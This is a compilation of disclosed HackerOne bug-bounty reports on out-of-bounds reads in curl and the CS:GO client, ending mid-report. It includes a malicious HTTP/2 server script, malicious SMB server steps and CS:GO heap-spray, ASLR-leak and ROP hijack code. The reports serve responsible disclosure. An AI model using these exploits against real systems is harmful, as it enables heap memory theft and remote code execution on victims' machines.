# Out-of-bounds Read

_15 reports — High/Critical, disclosed_

### [Heap-buffer-overflow in `Curl_ssl_push_certinfo_len()` — sole bounds check is `DEBUGASSERT`](https://hackerone.com/reports/3684614)

- **Report ID:** `3684614`
- **Severity:** High
- **Weakness:** Out-of-bounds Read
- **Program:** curl
- **Reporter:** @h3zh3z
- **Bounty:** - usd
- **Disclosed:** 2026-04-29T06:10:29.925Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

`Curl_ssl_push_certinfo_len()` in `lib/vtls/vtls.c` uses `DEBUGASSERT(certnum < ci->num_of_certs)` as its **only** bounds check before writing a heap pointer into `ci->certinfo[certnum]`. `DEBUGASSERT` is a no-op in every release/production build (`lib/curl_setup.h:1084`). Any mismatch between the count passed to `Curl_ssl_init_certinfo()` and the certnum values subsequently passed to `Curl_ssl_push_certinfo_len()` results in an unguarded heap out-of-bounds read and write.

This function is the single shared certinfo write path for all five TLS backends (OpenSSL, GnuTLS, mbedTLS, Rustls, Schannel). The `certnum` argument in every backend derives directly from the server-supplied certificate chain length. There is no runtime check in any production build.

## Affected version

Reproduced against:
- **curl 8.19.0** (tag `curl-8_19_0`, commit `8c908d2`, released 2025-03-10) — current stable release
- **curl 8.20.0-DEV** (commit `759f2e5`) — current development tip

Tested on Linux x86_64 with `clang`, AddressSanitizer, and UndefinedBehaviorSanitizer.

## Call path from `CURLOPT_CERTINFO` to the vulnerable write

When an application sets `CURLOPT_CERTINFO=1`, every successful TLS handshake runs the following sequence (shown for the OpenSSL backend; all five backends are identical in structure):

```
curl_easy_perform(handle)
  Curl_ossl_check_peer_cert()                      openssl.c:4736
    ossl_certchain(data, ssl)                       openssl.c:4739
      numcerts = sk_X509_num(peer_cert_chain)   <- server controls N
      Curl_ssl_init_certinfo(data, numcerts)     <- alloc N-slot table
      for i = 0 .. N-1:                         <- certnum = i
        Curl_ssl_push_certinfo_len(data, i, ...) <- called N times
          DEBUGASSERT(i < num_of_certs)          <- SOLE GUARD, no-op in release
          ci->certinfo[i] = ...                  <- heap write, unbounded in release
```

The same funneling path exists in all five backends:

| Backend | File | Line | Caller |
|---------|------|------|--------|
| OpenSSL | `openssl.c` | 392, 409–505 | `ossl_certchain()` |
| GnuTLS | `gtls.c` | 1630, 1638 | `Curl_extract_certinfo()` loop |
| mbedTLS | `mbedtls.c` | 433, 438 | `mbed_extract_certinfo()` |
| Rustls | `rustls.c` | 1225, 1250 | certinfo loop |
| Schannel | `schannel.c` | 1679, 1550 | `add_cert_to_certinfo()` |

## Vulnerable code

`lib/vtls/vtls.c:647–675`:

```c
CURLcode Curl_ssl_push_certinfo_len(struct Curl_easy *data,
                                    int certnum, ...)
{
  struct curl_certinfo *ci = &data->info.certs;

  DEBUGASSERT(certnum < ci->num_of_certs);   /* :658 — no-op in release */

  /* ... build label:value string ... */

  nl = Curl_slist_append_nodup(ci->certinfo[certnum], ...); /* :667 OOB READ  */
  ci->certinfo[certnum] = nl;                               /* :674 OOB WRITE */
}
```

`lib/curl_setup.h:1084`:

```c
#define DEBUGASSERT(x) do {} while(0)   /* release/production builds */
```

## Steps To Reproduce

1. Build curl with AddressSanitizer and UndefinedBehaviorSanitizer:

```bash
autoreconf -fi
CC=clang CFLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1" \
LDFLAGS="-fsanitize=address,undefined" \
./configure --disable-shared --with-openssl \
  --disable-docs --disable-manual
make -j"$(nproc)"
# If configure fails on optional deps (e.g. libpsl), add --without-libpsl
```

2. Compile the attached `poc.c` against the static libcurl:

```bash
clang -fsanitize=address,undefined -fno-omit-frame-pointer -g -O1 \
  -I./include -I./lib \
  poc.c ./lib/.libs/libcurl.a \
  -lssl -lcrypto -lz -lpthread -ldl \
  -o /tmp/poc_curl_certinfo_oob
```

3. Run it:

```bash
ASAN_OPTIONS="halt_on_error=0:print_stacktrace=1:detect_leaks=0" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
  /tmp/poc_curl_certinfo_oob
```

The PoC calls the real `Curl_ssl_init_certinfo()` (verified via `nm` in the static library) to allocate a production certinfo table for a 2-cert chain. It then replicates the exact read+write pattern from `Curl_ssl_push_certinfo_len()` at lines :667/:674 with `certnum=5`, bypassing the `DEBUGASSERT` to demonstrate release-build behavior.

Observed sanitizer output (curl 8.19.0):

```text
[*] certnum=5  OOB (only 2 allocated) — ASan should fire:

/work03/poc.c:173:20: runtime error: load of address 0x7be1db0e1a18 with insufficient
    space for an object of type 'struct curl_slist *'
    #0 in main poc.c:173:20
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior poc.c:173:20

==25989==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7be1db0e1a18
READ of size 8 at 0x7be1db0e1a18 thread T0
    #0 in main poc.c:173:20
SUMMARY: AddressSanitizer: heap-buffer-overflow poc.c:173:20 in main
```

## Impact

`Curl_ssl_push_certinfo_len()` is the sole write path for all five TLS backends when `CURLOPT_CERTINFO=1` is set. The only guard `DEBUGASSERT` is compiled out in every production build.

**Memory corruption in release builds.** Without the assert, `ci->certinfo[certnum]` is an unbounded heap array access. The write at `:674` stores a heap pointer at a server-influenced offset past the end of the allocated table, overwriting adjacent allocator metadata or live heap objects. This is a heap pointer write primitive relative to the certinfo array.

**All five TLS backends are affected equally.** Every backend derives `certnum` from the server-controlled certificate chain length and calls this unguarded function directly. Any future count mismatch in any backend — a filter applied before init but not before push, a new backend, a refactoring error — immediately becomes silent heap corruption in production with no fallback.

**Severity is High** because: the vulnerable code runs on every HTTPS connection that uses `CURLOPT_CERTINFO=1`; the input that drives `certnum` (certificate chain length) is server-controlled; the result in release builds is an unguarded heap pointer write; and the sole protection (`DEBUGASSERT`) is unconditionally absent in production.

The fix is a single runtime bounds check before the array access at `:658`.

---

### [Heap Out-of-Bounds Read in lib/http2.c via Malformed PUSH_PROMISE Headers](https://hackerone.com/reports/3506159)

- **Report ID:** `3506159`
- **Severity:** High
- **Weakness:** Out-of-bounds Read
- **Program:** curl
- **Reporter:** @darksql
- **Bounty:** - usd
- **Disclosed:** 2026-01-10T21:57:49.581Z
- **CVE(s):** -

**Vulnerability Information:**

Summary
A heap-based out-of-bounds read vulnerability exists in libcurl's HTTP/2 implementation. The on_header callback in lib/http2.c incorrectly treats header names and values provided by nghttp2 as null-terminated C-strings. Specifically, passing these pointers to curl_maprintf with the %s format specifier triggers an out-of-bounds read via strlen(), as nghttp2 provides raw byte buffers with explicit lengths, not null-terminated strings.
+1

Vulnerability Analysis & Root Cause
1. API Contract Violation: According to the nghttp2 documentation, the nghttp2_on_header_callback provides pointers to the header name and value (name, value) alongside their lengths (namelen, valuelen). The documentation explicitly states:

"The 'name' and 'value' pointers are NOT guaranteed to be null-terminated. [...] Applications MUST use the provided length parameters.".

2. Vulnerable Implementation: In lib/http2.c, the on_header function ignores the length parameters when formatting the string for PUSH_PROMISE headers, relying on curl_maprintf which internally uses strlen:

C

/* lib/http2.c around line 1642 - Vulnerable */
h = curl_maprintf("%s:%s", name, value); 
3. Execution Flow:

curl_maprintf parses the %s format specifier.

It internally calls strlen() on the name and value pointers.

Since the malicious server sends a header without a null byte, strlen() reads past the allocated buffer boundary until it hits a coincidental null byte in adjacent heap memory.

This results in an Out-of-Bounds Read.

Steps to Reproduce
1. Build Environment
Compile cURL with AddressSanitizer (ASAN) to visualize the memory violation:

Bash

./configure --with-nghttp2 --enable-debug CFLAGS="-fsanitize=address -g" LDFLAGS="-fsanitize=address"
make -j$(nproc)
2. Reproduction Script (http2_server.py)
This Python script (using h2) establishes an HTTP/2 connection and pushes a stream with a non-null-terminated header.

Python

import asyncio, h2.connection, h2.events, h2.config

async def handle(reader, writer):
    config = h2.config.H2Configuration(client_side=False)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    conn.update_settings({h2.settings.SettingCodes.ENABLE_PUSH: 1})
    writer.write(conn.data_to_send())
    await writer.drain()

    data = await reader.read(65535)
    events = conn.receive_data(data)
    
    for event in events:
        if isinstance(event, h2.events.RequestReceived):
            conn.send_headers(event.stream_id, [(':status', '200')])
            
            # MALICIOUS PAYLOAD: Header with no null termination logic
            malicious_name = b'x-oob-test' + b'A' * 64 
            malicious_val = b'trigger' + b'B' * 64
            
            conn.push_stream(event.stream_id, event.stream_id + 2, [
                (b':method', b'GET'), (b':path', b'/push'),
                (b':scheme', b'http'), (b':authority', b'localhost'),
                (malicious_name, malicious_val)
            ])
            writer.write(conn.data_to_send())
            await writer.drain()
            break
    writer.close()

asyncio.run(asyncio.start_server(handle, '127.0.0.1', 8080).serve_forever())
3. Execution
Run the server and connect with the ASAN-enabled cURL:

Bash

# Terminal 1
python3 http2_server.py

# Terminal 2
ASAN_OPTIONS=detect_stack_use_after_return=1 ./src/curl -v --http2-prior-knowledge http://127.0.0.1:8080/
Evidence (ASAN Log)
The following ASAN output confirms the read overflow. The READ of size... occurs inside strlen called by curl_maprintf.

Plaintext

==67356==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6c352e0e001a...
READ of size 11 at 0x6c352e0e001a thread T0
    #0 0x... in strlen
    #1 0x... in curl_maprintf
    #2 0x... in on_header lib/http2.c:1642
...
0x6c352e0e001a is located 0 bytes after 10-byte region...
Recommended Fix
The code must use the explicit namelen and valuelen parameters provided by the nghttp2 callback to limit the read operation.

Patch (lib/http2.c): Use the precision specifier %.*s which takes the length as an integer argument before the string pointer.

C

/* Fixed implementation */
h = curl_maprintf("%.*s:%.*s", (int)namelen, name, (int)valuelen, value);
Diff:

Diff

--- a/lib/http2.c
+++ b/lib/http2.c
@@ -1642,7 +1642,7 @@ static int on_header(nghttp2_session *session, const nghttp2_frame *frame,
-      h = curl_maprintf("%s:%s", name, value);
+      h = curl_maprintf("%.*s:%.*s", (int)namelen, name, (int)valuelen, value);

## Impact

Impact
Information Disclosure: Attackers can read sensitive data (keys, tokens, other request data) from the heap memory adjacent to the header buffer.

Availability: If the OOB read accesses unmapped memory, the application will crash.

---

### [Heap Buffer Over-Read via Malicious SMB Server READ_ANDX Response](https://hackerone.com/reports/3470095)

- **Report ID:** `3470095`
- **Severity:** High
- **Weakness:** Out-of-bounds Read
- **Program:** curl
- **Reporter:** @strokep
- **Bounty:** - usd
- **Disclosed:** 2025-12-20T15:57:54.931Z
- **CVE(s):** -

**Vulnerability Information:**

================================================================================
DESCRIPTION:
================================================================================

## Summary:

I discovered a heap buffer over-read vulnerability in libcurl's SMB protocol 
implementation. A malicious SMB server can send a specially crafted READ_ANDX 
response that causes curl to read and output up to 28KB of uninitialized heap 
memory per request. This results in information disclosure to the attacker.

The vulnerability exists in lib/smb.c within the smb_request_state() function,
specifically in the SMB_DOWNLOAD state handler at lines 1110-1137.

No AI was used to discover this vulnerability. AI was used only to assist 
with report formatting.

## Technical Analysis:

**Vulnerable Code (lib/smb.c lines 1116-1128):**

```c
case SMB_DOWNLOAD:
    if(h->status || smbc->got < sizeof(struct smb_header) + 15) {
      req->result = CURLE_RECV_ERROR;
      next_state = SMB_CLOSE;
      break;
    }
    
    // [1] Values read directly from attacker-controlled server response
    len = Curl_read16_le(((const unsigned char *)msg) +
                         sizeof(struct smb_header) + 11);
    off = Curl_read16_le(((const unsigned char *)msg) +
                         sizeof(struct smb_header) + 13);
    
    if(len > 0) {
      // [2] Bounds check validates against smbc->got (total received bytes)
      if(off + sizeof(unsigned int) + len > smbc->got) {
        failf(data, "Invalid input packet");
        result = CURLE_RECV_ERROR;
      }
      else
        // [3] Out-of-bounds read occurs here - reads heap memory
        result = Curl_client_write(data, CLIENTWRITE_BODY,
                                   (char *)msg + off + sizeof(unsigned int),
                                   len);
```

**Root Cause:**

1. The attacker controls the NetBIOS header length field, allowing them to 
   claim a large message size (e.g., 0x7100 bytes)
   
2. The attacker pads the response with null bytes to make smbc->got match 
   the claimed size

3. The attacker sets data_offset and data_length to read from any position 
   within the receive buffer

4. The bounds check at [2] passes because off + 4 + len <= smbc->got

5. curl reads len bytes from msg + off + 4, which includes uninitialized 
   heap memory beyond the actual SMB response data

**Result:** curl outputs ~28KB when the server only sent 256 bytes of 
legitimate data. The extra ~28KB is leaked heap memory.

## Affected version:

```
$ curl -V
curl 8.15.0 (x86_64-pc-linux-gnu) libcurl/8.15.0 OpenSSL/3.5.4 zlib/1.3.1 
brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 
nghttp2/1.64.0 nghttp3/1.12.0 librtmp/2.3 OpenLDAP/2.6.10
Release-Date: 2025-07-16
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs 
ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps 
telnet tftp ws wss
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy 
IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP 
UnixSockets zstd

Platform: Linux x86_64 (Kali GNU/Linux Rolling)
```

All curl versions with SMB support enabled (USE_CURL_NTLM_CORE defined) 
are likely affected.

## Steps To Reproduce:

  1. Extract the attached PoC files to a directory

  2. Run the automated exploit script:
     ```
     chmod +x run_exploit.sh
     ./run_exploit.sh
     ```

  3. Or manually:
     
     Terminal 1 - Start malicious server:
     ```
     python3 smb_exploit_server.py 4455
     ```
     
     Terminal 2 - Connect with curl:
     ```
     curl -u anyuser:anypass -o leaked.bin smb://127.0.0.1:4455/share/file.txt
     ```
     
     Terminal 2 - Verify the leak:
     ```
     ls -la leaked.bin
     # Shows: 28672 bytes (server only sent 256)
     
     xxd leaked.bin | head -20
     # First 256 bytes are 'A' (0x41), rest is heap memory
     ```

  4. Expected output:
     ```
     $ ls -la leaked.bin
     -rw-rw-r-- 1 user user 28672 Dec 18 13:00 leaked.bin
     
     $ xxd leaked.bin | head -20
     00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
     00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
     ... (256 bytes of 'A')
     00000100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
     ... (heap memory - 28416 bytes leaked)
     ```

## Supporting Material/References:

  * smb_exploit_server.py - Malicious SMB server (Python 3)
  * run_exploit.sh - Automated PoC runner script
  * Vulnerable code: https://github.com/curl/curl/blob/master/lib/smb.c#L1110-L1137
  * Buffer allocation: https://github.com/curl/curl/blob/master/lib/smb.c#L505

## Impact

================================================================================
IMPACT:
================================================================================

**Severity: Medium (CVSS 6.5)**

**CWE-125: Out-of-bounds Read**

A remote attacker operating a malicious SMB server can exploit this 
vulnerability to achieve:

**1. Heap Memory Disclosure**

The attacker can exfiltrate up to 28KB of heap memory from the curl client 
process per SMB READ request. This memory may contain:

- Authentication credentials from previous HTTP/FTP requests
- Session tokens and API keys
- Private data from other network operations
- Memory layout information useful for further exploitation

**2. Attack Vectors**

- Phishing: Send victim a link to smb://attacker-server/share/file.txt
- Typosquatting: Register domains similar to legitimate SMB servers
- Man-in-the-Middle: Intercept SMB connections and inject malicious responses
- Compromised Infrastructure: Attacker compromises an internal SMB server

**3. Exploitation Requirements**

- Victim must connect to attacker-controlled SMB server
- curl must be compiled with SMB support (common in Linux distributions)
- No authentication required - server accepts any credentials
- No user interaction beyond clicking a link
- Attack is silent - victim receives no error messages

**4. Proof of Exploitation**

The attached PoC demonstrates:
- Server sends 256 bytes of legitimate data
- curl receives and outputs 28,672 bytes
- 28,416 bytes of heap memory are leaked

**Recommended Fix:**

Validate that data_offset points within the actual SMB READ_ANDX response 
structure, not just within the total received bytes. The offset should be 
checked against the expected message layout and byte_count field.

---

### [Adam and the  Deadly  Injections](https://hackerone.com/reports/1217702)

- **Report ID:** `1217702`
- **Severity:** Critical
- **Weakness:** Out-of-bounds Read
- **Program:** h1-ctf
- **Reporter:** @akshansh
- **Bounty:** - usd
- **Disclosed:** 2021-06-18T04:58:09.641Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team adding the  flag here 
```
███
```

████

I will do the writeup in the below comments before the deadline itself
Thanks 
Akshansh

## Impact

....

---

### [RCE on CS:GO client using unsanitized entity ID in EntityMsg message](https://hackerone.com/reports/584603)

- **Report ID:** `584603`
- **Severity:** Critical
- **Weakness:** Out-of-bounds Read
- **Program:** Valve
- **Reporter:** @teapotd
- **Bounty:** 9000 usd
- **Disclosed:** 2021-05-27T16:54:18.221Z
- **CVE(s):** -

**Summary (team):**

Title:         RCE on CS:GO client using unsanitized entity ID in EntityMsg message
Scope:         csgo.exe
Weakness:      Out-of-bounds Read
Severity:      Critical (9.6)
Link:          https://hackerone.com/reports/584603
Date:          2019-05-19 17:49:21 +0000
By:            @chaynik

Details:
Vulnerability
-------------

`CSVCMsg_EntityMsg` message is used by server to notify client about generic actions regarding entities. The message is described using the following Protocol Buffer:

```
message CSVCMsg_EntityMsg {
    optional int32 ent_index = 1;
    optional int32 class_id = 2;
    optional bytes ent_data = 3;
}
```

The pseudocode of function handling this message:

```cpp
void ProcessEntityMessage(CSVCMsg_EntityMsg *msg) {
    IClientNetworkable *entity = entitylist->GetClientNetworkable(msg->ent_index);
    if (entity) {
        ...
        entity->ReceiveMessage(...);
        ...
    }
    ...
}
```

Neither handler nor `GetClientNetworkable` check if entity index is valid - an arbitrary integer can be passed. This can lead to memory access outside of entity list and then to virtual function call on invalid object. By careful manipulation it can be used to divert control flow to attacker's payload.

Exploitation
------------

The exploit is based on assumption that `client_panorama.dll` base address is known to the attacker. It can be procured using additional memory disclousure vulnerability, like #581774. Alternatively, in case of distributed attack guessing address may be viable (32-bit ASLR has low entropy).

The first stage is to find a variable with known address that can be controlled by server. For example, I chose to use map name because its copy is stored in a global variable somewhere in `client_panorama.dll`. Note that it's expected behavior and not a vulnerability.

Then I crafted a payload containing ROP chain and fake `IClientNetworkable` object. The payload is sent to server as map name. Obviously, map name is a string and cannot contain null characters, but there's easy way to bypass this limitation by overwriting it several times.

The final step is to use the vulnerability to trick client into executing virtual function on the fake object. Entity list is a statically allocated array inside `client_panorama.dll`, so the offset to the payload is constant. An appropriate entity index is calculated from the offset and message is sent.

The ROP chain goal is to run Calculator app. Luckily, `client_panorama.dll` imports `IProcessUtils` interface from `tier0.dll` which can be used to start processes. It simplifies ROP chain considerably.

Proof of Concept
----------------

The PoC script is demonstrating RCE capability on CS:GO client for Windows (version 13696, 2019-05-16 stable release).

1. Download attached script: F492694
2. Start CS:GO client
3. Use a debugger to get the base address of `client_panorama.dll` and set `CLIENT_BASE` variable in downloaded script
4. Run attached Python 3 script (possibly on another host)  
**Note:** If you run this script on the same host as client you might need to change the default `PORT` (because for some reason CS:GO client uses it).
5. Connect to the malicious server and wait for `calc.exe` to pop up

{F492696}

Similarly as in #470520, Steam browser protocol can be used to launch an attack from web browser:

1. Follow steps 1-4 as above
2. Download attached HTML file (F492697) and set IP in iframe URL to malicious server
3. Open downloaded HTML file and wait for `calc.exe` to pop up

{F492695}

## Impact

An attacker can execute arbitrary code on the computer of anyone who attempts to connect to the server. After succesful exploitation an attacker can gain control over victim's computer and do whatever they want.

The connection to the server can be initiated manually by the victim or automatically using Steam browser protocol on malicious web site.

The likelihood of victim joining the server via in-game server browser can be greatly improved by faking high player count and further social engineering. Many players sort server list by player amount.

In case of an attack from web browser many users don't need to click `Open steam` and this method requires no further interaction from user - connection will be initiated without confirmation (even CS:GO client will be started if it's not running).

---

### [CS:GO Server -> Client RCE through OOB access in CSVCMsg_SplitScreen + Info leak in HTTP download](https://hackerone.com/reports/1070835)

- **Report ID:** `1070835`
- **Severity:** Critical
- **Weakness:** Out-of-bounds Read
- **Program:** Valve
- **Reporter:** @simonscannell
- **Bounty:** 7500 usd
- **Disclosed:** 2021-05-17T22:01:21.010Z
- **CVE(s):** -

**Summary (team):**

Title:         CS:GO Server -> Client RCE through OOB access in CSVCMsg_SplitScreen + Info leak in HTTP download
Scope:         csgo.exe
Weakness:      Out-of-bounds Read
Severity:      Critical (9.6)
Link:          https://hackerone.com/reports/1070835
Date:          2021-01-04 00:22:02 +0000
By:            @simonscannell

Details:
We managed to write an extremely reliable exploit for CS:GO on Windows by chaining  an OOB access that leads to RIP control and an Info leak. This report consists of two  critical bugs. The memory leak was initially reported in #1064367, where the other bug  in the same report was a duplicate and the OOB access in #1064809. Altough #1064809 is still open as an explot was expected, we still wanted to make a new report where both bugs are in one place, as they are both two completely unique bugs.

Here is a PoC video of the exploit in action:

{F1143323}


# Vulnerability details

## Bug #1: Information leak through HTTP downloads

During vulnerability research, we found out that CS:GO dedicated servers can host custom map and game modes, all of which depend on custom files. Game client's can connect to these servers and download these files dynamically. Usually, a CS:GO server maintainer would create a list of required files and write them into a `.res` file, which has the same name as the map the server is running on. We found this feature highly interesting, as it involves interaction with yet another untrusted server.

After reversing the code that actually handles the HTTP download on the client side on Linux, we found out that it was handled by curl and the logic seems to be the following:

1. Create a CURL object and set all necessary options (URL, timeout, User-Agent etc)
2. Register a callback that is called for every HTTP header the server sends
3. Register a callback that is called when the data of the body of the HTTP response is received

This logic can be seen in the following screenshot:

{F1143263}

After looking at the code that implements the callbacks, we found that the following logic applies:

1. The header callback looks for the `Content-Length` header and uses its value to allocate a buffer to fit the file into. It does so through a case-sensitive string search.
2. The write callback then writes the data that is received into the buffer
3. After the download finished, it is written to the destination file.

Here is a screenshot showing how a case-sensitive search is implemented and how it is used to allocate a buffer:

{F1143269}

The bug that occurs here is that if two `Content-Length` headers are sent, but one is written with uppercase characters (`Content-Length`) and the other header with all lower case characters `content-length`, then the CS:GO code will reocognize only the first and allocate a buffer with whatever size is within the field. The second header is however missed by the CS:GO code but not by curl. Here is an example HTTP response to demonstrate this:


```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1337
content-length: 0
Connection: closed
```

If such a response is received, a buffer of size **1337** is allocated. However, the second `Content-Length` header tells the HTTP client, in this case curl, that no data will follow. This means that no data is ever actually written into the file buffer. The next bug is that CS:GO does not check if the data that has been received matches the size of the buffer. It will still write the allocated buffer into a file. However, since no data has been written, an attacker controlled size of uninitalized Heap memory is written to the file. 

An attacker can then use the `NETMsg_File` message to have the client upload the just created file containing uninitialized memory. The attacker is then able to view memory contents of the user's process that have been freed before. In our case, we parsed the file and searched for pointers that we used to break ASLR in the client's game process and further exploit the client.


## Bug #2: OOB access in CSVCMsg_SplitScreen

The source engine supports splitscreen users in games. We noticed this fact when looking through the available protobuf messages for CS:GO clients when we spotted the following message:

```
message CSVCMsg_SplitScreen {
    optional .ESplitScreenMessageType type = 1 [default = MSG_SPLITSCREEN_ADDUSER];
    optional int32 slot = 2;
    optional int32 player_index = 3;
}
```

This message was interesting to us, as it contained an index. As it turns out, it is not the `player_index` but the `slot` field that is used as an array index into a statically sized, global array based in `engine.dll`.

The following screenshot must be understood with the context in mind that `ecx` points to a global array in the `.data` section of `engine.dll`. `edx` is controlled by an attacker and corresponds to the `slot` field. There are no checks made on this value:

{F1143270}

As can be seen, a pointer to some object, probably an object representating a split screen user is fetched from the array. The first byte of the object is then tested for a NULL byte.

if the first byte of whatever the object is pointing to is 0, the function continues execution and arrives at a section that is highly interesting to an attacker:

{F1143272}

Keep in mind that `ebx` was a value that was derived through an OOB access and could be attacker controlled.

What we see here is that  a vtable is dereferenced at offset **8** from `ebx`. This vtable is then used to jump to a dynamic location. 

This means that if an attacker can control the contents of  what `ebx` points to, he can point to a fake vtable under his control and ultimately control the Program Counter and thus gains the ability to execute code remotely.


# Exploitation

With these two powerful bugs at hand, we went ahead and wrote an exploit. The exploitation strategy was to use the info leak to break ASLR and obtain the base address of the `engine.dll` file in memory. From there, we could use the OOB access to hijack the `eip` register and make it point somewhere useful in `engine.dll` and execute a ROP chain.


## Breaking ASLR

Breaking ASLR happens in two steps:

1. Allocate and deallocate an object containing a pointer to `engine.dll` thousands of times on the heap.
2. Have the client write multiple files of uninitialized memory of the same size as the object created in the previous step to disk and upload it to the server. By abusing known behavior of the Windows Heap allocator and of the objects, it is extremely likely that one of the objects containing a pointer to `engine.dll` can be found in the file.  

During testing, this exploit fails around 2/100 times.

We found that the message `CSVCMsg_SendTable` can be sent a variable amount of times to the client, where each message allocates a buffer of a variable number of `sendprop_t` objects on the heap. As it turned out, this object contains a function pointer into `engine.dll`. It's definition is shown here:

```
message CSVCMsg_SendTable
{
	message sendprop_t
	{
		optional int32 type = 1;				// SendPropType
		optional string var_name = 2;
		optional int32 flags = 3;
		optional int32 priority = 4;
		optional string dt_name = 5;			// if pProp->m_Type == DPT_DataTable || IsExcludeProp
		optional int32 num_elements = 6;		// else if pProp->m_Type == DPT_Array
		optional float low_value = 7;			// else ...
		optional float high_value = 8;			// 		...
		optional int32 num_bits = 9;			//		...
	};

	optional bool is_end = 1;
	optional string net_table_name = 2;
	optional bool needs_decoder = 3;
	repeated sendprop_t props = 4;
}
```

We created this message and sent it `256` times with some unique values, as demonstrated here:

```Python
def spray_send_table(s, addr, nprops):
    table = nmsg.CSVCMsg_SendTable()
    table.is_end = False
    table.net_table_name = "abctable"
    table.needs_decoder = False

    for i in range(nprops):
        prop = table.props.add()
        prop.type = 0x1337ee00
        prop.var_name = "abc"
        prop.flags = 0
        prop.priority = 0
        prop.dt_name = "whatever"
        prop.num_elements = 0
        prop.low_value = 0.0
        prop.high_value = 0.0
        prop.num_bits = 0x00ff00ff

    tosend = prepare_payload(table, 9)
    s.sendto(tosend, addr)
```

The reason for these unique values is that we can search them for them in the files the client uploads, which contain uninitialized memory. If we find these values, we can be sure that a `sendprop_t` object, along with a function pointer has been included in the info leak files.

Here is the corresponding code that parses the uninitialized memory sent by a client:

```Python
for i in range(len(data) - 0x54):
        vtable_ptr = struct.unpack('<I', data[i:i+4])[0]
        table_type = struct.unpack('<I', data[i+8:i+12])[0]
        table_nbits = struct.unpack('<I', data[i+12:i+16])[0]
        if table_type == 0x1337ee00 and table_nbits == 0x00ff00ff:
            engine_base = vtable_ptr - OFFSET_VTABLE 
```

By simply subtracting the offset of the vtable within `engine.dll`, it was possible to leak the client's `engine.dll` base address in memory.

## Hijacking RIP

We mentioned that the second bug, an OOB access can be used to control a pointer. Since the array where the OOB access occurs in is a global variable and located within the `.data` section of `engine.dll`, we thought that it would be best to search for a controlled value within this `.dll` file to make the pointer, contained within `ebx` as shown previously, point to an attacker-controlled fake object containing a fake vtable.

As it turns out, one of the mechanisms through which server and client setup a game are `convars`. These `convars` contain information such as the URL from which to download files from or any other configuration settings of a server or client.

They are sent through the `CMsg_CVars` message

```
message CMsg_CVars
{
	message CVar
	{
		optional string name = 1;
		optional string value = 2;
		optional uint32 dictionary_name = 3;		// In order to save on connect packet size convars that are known will have their dictionary name index sent here
	}

	repeated CVar cvars = 1;
}

message CNETMsg_SetConVar
{
	optional CMsg_CVars convars = 1;
}
```

As can be seen here, a variable amount of `convar`s is sent to the client by the server, each containing  a controlled name and value field. These `convars` are global objects, located within `engine.dll`. When a server sends a `convar`, the string value is copied to the heap and a pointer to it saved within the global `convar`'s object.

This means that if our exploit setup a fake object by crafting a string value containing a fake object and vtable, a pointer to it is stored at a known offset within the global binary.

Here is an illustration showing the chain of pointers that is going to happen:

{F1143293}

The illustration shows how the splitscreen array OOB is used to interpret the pointer to the string value of a `convar` as an object. The fake object's vtable pointer points back into `engine.dll` into another convar. The `convar`s turned out to be a very powerful gadget, as they could take both string and integer values and store them each into their object's memory. 

With this target memory layout in mind, let's look at the code that dereferences the fake object to vtable to `eip` again:

{F1143272}

Keep in mind, `ebx`, if the `slot` field is set accordingly, contains the pointer to the controlled string  value of a `convar`. It then dereferences it at offset **8** and moves the result into `eax`. This corresponds to the fake vtable pointer pointing back at the convar in the illustration. `eax` is then dereferenced at offset `0xAC`. By setting up another convar with an integer value, we can control the result of this pointer dereference which is then `call`'d and thus arbitrary RIP control is gained.

Since all offsets are known, this step of the exploit chain is 100% reliable.

## ROP

We then utilized a technique called `ROP`chaining to setup a an attacker controlled stack and finally execute the `ShellExecuteA()` Windows standard library function to execute arbitrary system commands. In our case, we simply spawned a calculator.


# Reproduction

Attached is a `poc.zip` file containing all required files to launch the PoC exploit. Unpack it into a directory and activate its Python3 virtual environment via the command (on Windows' cmd):

```
.\poc_env\Scripts\activate
```

Then execute the script through `python .\poc.py`

Then, on Windows, start the CS:GO game and activate the developer console:

1. Start the game and within the game settings enable the developer console. Game-> Enable Develoepr Console-> yes
2. Then, within the settings go to Mouse / Keyboard-> UI keys -> Toggle Developer Consoleand set it to your preferred key

Finally, open the developer console and connect to the fake server via the command:

`connect YOUR_IP:1337`

Replace `YOUR_IP` with your local LAN IP (192.*)

A calculator should be opened. If the exploit fails for some reason, just try again. Please do not hesitate to point out exploit failures or questions on reproduction. We have tested the exploit highly successfully against 3 different Windows 10 machines.

## Impact

This exploit allows an attacker in control of a malicious CS:GO server to execute arbitrary code, including malware, on any client that connects to the server. An attacker could steal Steam credentials or take over the machine and use it for further malicious purposes. These two vulnerabilities can be exploited extremely reliable on both Windows and Linux clients.

---

### [OOB reads in network message handlers leads to RCE](https://hackerone.com/reports/807772)

- **Report ID:** `807772`
- **Severity:** Critical
- **Weakness:** Out-of-bounds Read
- **Program:** Valve
- **Reporter:** @slidybat
- **Bounty:** 7500 usd
- **Disclosed:** 2021-05-04T00:25:22.781Z
- **CVE(s):** -

**Vulnerability Information:**

# Vulnerability
In Source engine games there are many network messages sent from the server to the client that take an entity index. There is a common pattern among many of these messages for the lower bounds of the entity index to be checked but not the upper bounds. In many cases these out of bound reads get an entity pointer from that index then call a virtual function on it.

As an example, here is the handler for the CS:GO [`GlowPropTurnOff`](https://github.com/SteamDatabase/Protobufs/blob/7c7bc10a1ed346a88cc6b9c13d6642578a9ecd50/csgo/cstrike15_usermessages.proto#L444-L446) message:

```cpp
